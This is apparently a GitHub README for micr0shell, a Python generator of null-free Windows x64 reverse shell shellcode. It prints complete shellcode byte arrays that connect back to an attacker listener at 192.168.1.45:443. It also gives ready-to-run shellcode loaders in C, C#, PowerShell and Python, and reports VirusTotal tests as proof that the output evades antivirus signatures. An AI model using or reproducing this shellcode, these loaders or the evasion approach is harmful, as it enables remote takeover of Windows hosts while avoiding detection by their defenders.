# micr0 shell
Micr0shell is a lightweight and efficient Python script designed for dynamically generating Windows X64 Position-Independent Code (PIC) Null-Free reverse shell shellcode. Depending on the options selected, the generated shellcode can be up to `27` bytes smaller than comparable shellcode from msfvenom, while also avoiding the inclusion of 0x00 bytes. Additionally, because MSF's shellcode is widely used and therefore more likely to be flagged by signature-based detection methods, the shellcode generated by micr0shell offers an added layer of evasion capability.

```Shellcode Generated by MSF
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.45 LPORT=443 -f csharp -v shellcode -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=7, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 503 (iteration=0)
x64/xor chosen with final size 503
Payload size: 503 bytes
Final size of csharp file: 2586 bytes
byte[] shellcode = new byte[503] {
0x48,0x31,0xc9,0x48,0x81,0xe9,0xc6,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
0xff,0xff,0x48,0xbb,0x2b,0x1e,0x7f,0x17,0x61,0x58,0xad,0xc4,0x48,0x31,0x58,
0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0xd7,0x56,0xfc,0xf3,0x91,0xb0,
0x6d,0xc4,0x2b,0x1e,0x3e,0x46,0x20,0x08,0xff,0x95,0x7d,0x56,0x4e,0xc5,0x04,
0x10,0x26,0x96,0x4b,0x56,0xf4,0x45,0x79,0x10,0x26,0x96,0x0b,0x56,0xf4,0x65,
0x31,0x10,0xa2,0x73,0x61,0x54,0x32,0x26,0xa8,0x10,0x9c,0x04,0x87,0x22,0x1e,
0x6b,0x63,0x74,0x8d,0x85,0xea,0xd7,0x72,0x56,0x60,0x99,0x4f,0x29,0x79,0x5f,
0x2e,0x5f,0xea,0x0a,0x8d,0x4f,0x69,0x22,0x37,0x16,0xb1,0xd3,0x2d,0x4c,0x2b,
0x1e,0x7f,0x5f,0xe4,0x98,0xd9,0xa3,0x63,0x1f,0xaf,0x47,0xea,0x10,0xb5,0x80,
0xa0,0x5e,0x5f,0x5e,0x60,0x88,0x4e,0x92,0x63,0xe1,0xb6,0x56,0xea,0x6c,0x25,
0x8c,0x2a,0xc8,0x32,0x26,0xa8,0x10,0x9c,0x04,0x87,0x5f,0xbe,0xde,0x6c,0x19,
0xac,0x05,0x13,0xfe,0x0a,0xe6,0x2d,0x5b,0xe1,0xe0,0x23,0x5b,0x46,0xc6,0x14,
0x80,0xf5,0x80,0xa0,0x5e,0x5b,0x5e,0x60,0x88,0xcb,0x85,0xa0,0x12,0x37,0x53,
0xea,0x18,0xb1,0x8d,0x2a,0xce,0x3e,0x9c,0x65,0xd0,0xe5,0xc5,0xfb,0x5f,0x27,
0x56,0x39,0x06,0xf4,0x9e,0x6a,0x46,0x3e,0x4e,0x20,0x02,0xe5,0x47,0xc7,0x3e,
0x3e,0x45,0x9e,0xb8,0xf5,0x85,0x72,0x44,0x37,0x9c,0x73,0xb1,0xfa,0x3b,0xd4,
0xe1,0x22,0x5e,0xdf,0x2f,0xde,0xf6,0x74,0x2d,0x4d,0x17,0x61,0x19,0xfb,0x8d,
0xa2,0xf8,0x37,0x96,0x8d,0xf8,0xac,0xc4,0x2b,0x57,0xf6,0xf2,0x28,0xe4,0xaf,
0xc4,0x2a,0xa5,0xbf,0xbf,0x60,0x75,0xec,0x90,0x62,0x97,0x9b,0x5b,0xe8,0xa9,
0xec,0x7e,0x67,0x69,0x59,0x10,0x9e,0x8d,0xe1,0x4d,0xc1,0x76,0x7e,0x16,0x61,
0x58,0xf4,0x85,0x91,0x37,0xff,0x7c,0x61,0xa7,0x78,0x94,0x7b,0x53,0x4e,0xde,
0x2c,0x69,0x6d,0x8c,0xd4,0xde,0x37,0x9e,0xa3,0x10,0x52,0x04,0x63,0x97,0xbe,
0x56,0xdb,0xb2,0xa2,0x1b,0xcb,0xe1,0xaa,0x5f,0xe8,0x9f,0xc7,0xd4,0x6a,0x46,
0x33,0x9e,0x83,0x10,0x24,0x3d,0x6a,0xa4,0xe6,0xb2,0x15,0x39,0x52,0x11,0x63,
0x9f,0xbb,0x57,0x63,0x58,0xad,0x8d,0x93,0x7d,0x12,0x73,0x61,0x58,0xad,0xc4,
0x2b,0x5f,0x2f,0x56,0x31,0x10,0x24,0x26,0x7c,0x49,0x28,0x5a,0x50,0x98,0xc7,
0xc9,0x72,0x5f,0x2f,0xf5,0x9d,0x3e,0x6a,0x80,0x0f,0x4a,0x7e,0x16,0x29,0xd5,
0xe9,0xe0,0x33,0xd8,0x7f,0x7f,0x29,0xd1,0x4b,0x92,0x7b,0x5f,0x2f,0x56,0x31,
0x19,0xfd,0x8d,0xd4,0xde,0x3e,0x47,0x28,0xa7,0x65,0x89,0xa2,0xdf,0x33,0x9e,
0xa0,0x19,0x17,0xbd,0xe7,0x21,0xf9,0xe8,0xb4,0x10,0x9c,0x16,0x63,0xe1,0xb5,
0x9c,0x6f,0x19,0x17,0xcc,0xac,0x03,0x1f,0xe8,0xb4,0xe3,0x5d,0x71,0x89,0x48,
0x3e,0xad,0xc7,0xcd,0x10,0x59,0xd4,0xcb,0x37,0x94,0xa5,0x70,0x91,0xc2,0x57,
0x14,0xff,0xec,0x81,0x2d,0xa8,0x7f,0x6c,0x0d,0x0d,0x78,0x0b,0x58,0xf4,0x85,
0xa2,0xc4,0x80,0xc2,0x61,0x58,0xad,0xc4 };
```
## Background
I acquired my skills in x86 shellcode development through the `Offensive Security Exploit Developer` (OSED) course, which I found particularly captivating. Prior to the course, shellcode development seemed like a mysterious field to me, but I quickly realized how much flexibility it offers for achieving specific objectives. Recognizing that x64 shellcoding is more relevant and widely used in today's landscape, I've applied what I've learned to develop this dynamic and convenient Windows x64 reverse shell shellcode generator script.

## How to Use
### Install Keystone Engine
To generate shellcode from x64 assembly instructions in a Python script, `keystone` engine dependency is needed. Use `pip` to install Keystone Engine:

```python
pip install keystone-engine
```

### Script Usage
Users have the flexibility to specify various parameters: the `IP address`, `listening port`, `variable name`, `shellcode format` (options include C, CSharp, Python, and PowerShell), `shell type` (either PowerShell or CMD), whether to `save` the generated shellcode to a file, and whether to `execute` the generated shellcode (True/False).

```bash
└─# python3 micr0shell.py                                                                                                                         

███╗░░░███╗██╗░█████╗░██████╗░░█████╗░  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
████╗░████║██║██╔══██╗██╔══██╗██╔══██╗  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██╔████╔██║██║██║░░╚═╝██████╔╝██║░░██║  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║╚██╔╝██║██║██║░░██╗██╔══██╗██║░░██║  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
██║░╚═╝░██║██║╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝██║░░██║███████╗███████╗███████╗
╚═╝░░░░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

Author: Senzee
Github Repository: https://github.com/senzee1984/micr0_shell
Description: Dynamically generate PIC Null-Free Reverse Shell Shellcode
Attention: In rare cases (.255 and .0 co-exist), generated shellcode could contain NULL bytes, E.G. when IP is 192.168.0.255


usage: micr0shell.py [-h] --ip IP [--port PORT] [--language LAN] [--variable VAR] [--type SHELL_TYPE] [--execution CODE_EXEC] [--save SAVE]
                     [--output OUTPUT]
micr0shell.py: error: the following arguments are required: --ip/-i

```

Only the `IP address` must be specified to make the shellcode work well. The default port value is `443`, the default variable name is `buf`, the default language is `python`, and the default shell type is `cmd.exe`.

Users can choose to execute generated shellcode in this Python script, generated shellcode can also be saved in a binary file. By default, generated shellcode is `NOT EXECUTED` and `NOT SAVED` in a file.

### Simple Shellcode Runner
Simple shellcode loaders in different common languages are provided below to test the generated shellcode conveniently. 

However, if you're interested in evaluating evasion capabilities, be aware that the following shellcode loaders could themselves be detected. For more advanced evasion techniques, you may want to explore alternative shellcode loaders, which are beyond the scope of this README document.

#### C
```c
#include "windows.h"
#include "stdlib.h"

unsigned char shellcode[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0......};  // SHELLCODE HERE

int main()
{
    int length = sizeof(shellcode);
    void* exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(exec, shellcode, length);
    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
}
```

#### CSharp
```csharp
using System;
using System.Runtime.InteropServices;

namespace runner
{
    public class runner
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void Main(String[] args)
        {
            byte[] buffer= new byte[479] {0x48,0x31,0xd2,0x65,0x48,0x8b,0x42,0x60,0x48......};  // SHELLCODE HERE
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }
    }
}
```

#### PowerShell
```powershell
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
     Equals('System.dll')
     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
@($moduleName)), $functionName))
}


function getDelegateType {
    Param (
     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
    AutoClass', [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
[System.Reflection.CallingConventions]::Standard, $func).
     SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
$func). SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

$lpMem =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = <SHELLCODE HERE>

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
$hThread =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

#### Python
```python
import ctypes, struct


buf =  b"\x48\x31\...."  # SHELLCODE HERE
buf=bytearray(buf)

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(buf)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(buf)).from_buffer(buf)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),
                                     buf,
                                     ctypes.c_int(len(buf)))
print("Shellcode located at address %s" % hex(ptr))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_uint64(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
```

## Known Issues
1. Based on the provided `IP address`, `port`, and `shell type`, micr0shell dynamically generates Null-Free shellcode. While I've accounted for most common scenarios that could introduce Null bytes, it's worth noting that if the supplied IP address contains both `.255` and `.0`—such as `192.168.0.255`—the generated shellcode will include a Null byte. Though such IP addresses are relatively rare in practice, eliminating Null bytes for all possible IP addresses would significantly increase complexity. As a result, I have no immediate plans to address this issue.

2. Concerning the port value, theoretically, no port should produce a Null byte. However, due to the way Null-byte elimination is implemented, port `65280` is not usable.

3. On `Windows 11`, `double-clicking` the shellcode loader program/script will cause the shell session to exit quickly. However, if you launch it through `CMD` or `PowerShell`, the shell session will remain active until you disconnect from the server. This issue is currently under investigation and appears to be related to the shellcode itself. I will find a way to fix this ASAP.


## Test Case
Shellcode signature evasion capability test, sample files are uploaded to VirusTotal in Aug, 2023.

### Shellcode Bin File
Use msfvenom and micr0shell to generate raw binary files, and upload them, respectively. There are 2 samples generated from msfvenom, one includes 0x00, and the other is Null-Free. The comparison is as follows:

![image](/screenshot/msf_include_00.jpg)

![image](/screenshot/msf_null_free.jpg)

![image](/screenshot/micr0shell.jpg)

By `8/13/2023`, raw shellcode bin file generated by micr0shell is not signatured.

### Simple Shellcode Loader in C
Use msfvenom and micr0shell to generate shellcode byte array, and include them in a simple shellcode runner written in C, respectively. There are 2 shellcodes generated from msfvenom, one includes 0x00, and the other is Null-Free. The comparison is as follows:

![image](/screenshot/loader_msf_include_00.jpg)

![image](/screenshot/loader_msf.jpg)

![image](/screenshot/loader_micr0.jpg)

By `8/23/2023`, the shellcode loader includes the shellcode generated by micr0shell has much less detection. It is worth mentioning that the simple shellcode loader itself is signatured, even if the shellcode is harmless.



## Screenshot

![image](/screenshot/test.jpg)

```cmd
─# python3 micr0shell.py --ip 192.168.1.45 --port 443 --type cmd --language c --variable shellcode --execution false --save True --output buf.bin

███╗░░░███╗██╗░█████╗░██████╗░░█████╗░  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
████╗░████║██║██╔══██╗██╔══██╗██╔══██╗  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██╔████╔██║██║██║░░╚═╝██████╔╝██║░░██║  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║╚██╔╝██║██║██║░░██╗██╔══██╗██║░░██║  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
██║░╚═╝░██║██║╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝██║░░██║███████╗███████╗███████╗
╚═╝░░░░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

Author: Senzee
Github Repository: https://github.com/senzee1984/micr0_shell
Description: Dynamically generate PIC Null-Free Reverse Shell Shellcode
Attention: In rare cases (.255 and .0 co-exist), generated shellcode could contain NULL bytes, E.G. when IP is 192.168.0.255


[+]Shellcode Settings:
******** IP Address: 192.168.1.45
******** Listening Port: 443
******** Language of desired shellcode runner: c
******** Shellcode array variable name: shellcode
******** Shell: cmd
******** Shellcode Execution: false
******** Save Shellcode to file: true


[+]Payload size: 476 bytes

[+]Shellcode format for C

unsigned char shellcode[]={
0x48,0x31,0xd2,0x65,0x48,0x8b,0x42,0x60,0x48,0x8b,0x70,0x18,0x48,0x8b,0x76,0x30,0x4c,0x8b,0x0e,0x4d,
0x8b,0x09,0x4d,0x8b,0x49,0x10,0xeb,0x63,0x41,0x8b,0x49,0x3c,0x4d,0x31,0xff,0x41,0xb7,0x88,0x4d,0x01,
0xcf,0x49,0x01,0xcf,0x45,0x8b,0x3f,0x4d,0x01,0xcf,0x41,0x8b,0x4f,0x18,0x45,0x8b,0x77,0x20,0x4d,0x01,
0xce,0xe3,0x3f,0xff,0xc9,0x48,0x31,0xf6,0x41,0x8b,0x34,0x8e,0x4c,0x01,0xce,0x48,0x31,0xc0,0x48,0x31,
0xd2,0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xca,0x0d,0x01,0xc2,0xeb,0xf4,0x44,0x39,0xc2,0x75,0xda,0x45,
0x8b,0x57,0x24,0x4d,0x01,0xca,0x41,0x0f,0xb7,0x0c,0x4a,0x45,0x8b,0x5f,0x1c,0x4d,0x01,0xcb,0x41,0x8b,
0x04,0x8b,0x4c,0x01,0xc8,0xc3,0xc3,0x4c,0x89,0xcd,0x41,0xb8,0x8e,0x4e,0x0e,0xec,0xe8,0x8f,0xff,0xff,
0xff,0x49,0x89,0xc4,0x48,0x31,0xc0,0x66,0xb8,0x6c,0x6c,0x50,0x48,0xb8,0x57,0x53,0x32,0x5f,0x33,0x32,
0x2e,0x64,0x50,0x48,0x89,0xe1,0x48,0x83,0xec,0x20,0x4c,0x89,0xe0,0xff,0xd0,0x48,0x83,0xc4,0x20,0x49,
0x89,0xc6,0x49,0x89,0xc1,0x41,0xb8,0xcb,0xed,0xfc,0x3b,0x4c,0x89,0xcb,0xe8,0x55,0xff,0xff,0xff,0x48,
0x31,0xc9,0x66,0xb9,0x98,0x01,0x48,0x29,0xcc,0x48,0x8d,0x14,0x24,0x66,0xb9,0x02,0x02,0x48,0x83,0xec,
0x30,0xff,0xd0,0x48,0x83,0xc4,0x30,0x49,0x89,0xd9,0x41,0xb8,0xd9,0x09,0xf5,0xad,0xe8,0x2b,0xff,0xff,
0xff,0x48,0x83,0xec,0x30,0x48,0x31,0xc9,0xb1,0x02,0x48,0x31,0xd2,0xb2,0x01,0x4d,0x31,0xc0,0x41,0xb0,
0x06,0x4d,0x31,0xc9,0x4c,0x89,0x4c,0x24,0x20,0x4c,0x89,0x4c,0x24,0x28,0xff,0xd0,0x49,0x89,0xc4,0x48,
0x83,0xc4,0x30,0x49,0x89,0xd9,0x41,0xb8,0x0c,0xba,0x2d,0xb3,0xe8,0xf3,0xfe,0xff,0xff,0x48,0x83,0xec,
0x20,0x4c,0x89,0xe1,0x48,0x31,0xd2,0xb2,0x02,0x48,0x89,0x14,0x24,0x48,0x31,0xd2,0x66,0xba,0x01,0xbb,
0x48,0x89,0x54,0x24,0x02,0xba,0xc0,0xa8,0x01,0x2d,0x48,0x89,0x54,0x24,0x04,0x48,0x8d,0x14,0x24,0x4d,
0x31,0xc0,0x41,0xb0,0x16,0x4d,0x31,0xc9,0x48,0x83,0xec,0x38,0x4c,0x89,0x4c,0x24,0x20,0x4c,0x89,0x4c,
0x24,0x28,0x4c,0x89,0x4c,0x24,0x30,0xff,0xd0,0x48,0x83,0xc4,0x38,0x49,0x89,0xe9,0x41,0xb8,0x72,0xfe,
0xb3,0x16,0xe8,0x99,0xfe,0xff,0xff,0x48,0xba,0x9c,0x92,0x9b,0xd1,0x9a,0x87,0x9a,0xff,0x48,0xf7,0xd2,
0x52,0x48,0x89,0xe2,0x41,0x54,0x41,0x54,0x41,0x54,0x48,0x31,0xc9,0x66,0x51,0x51,0x51,0xb1,0xff,0x66,
0xff,0xc1,0x66,0x51,0x48,0x31,0xc9,0x66,0x51,0x66,0x51,0x51,0x51,0x51,0x51,0x51,0x51,0xb1,0x68,0x51,
0x48,0x89,0xe7,0x48,0x89,0xe1,0x48,0x83,0xe9,0x20,0x51,0x57,0x48,0x31,0xc9,0x51,0x51,0x51,0x48,0xff,
0xc1,0x51,0xfe,0xc9,0x51,0x51,0x51,0x51,0x49,0x89,0xc8,0x49,0x89,0xc9,0xff,0xd0};


Generated shellcode successfully saved in file buf.bin
```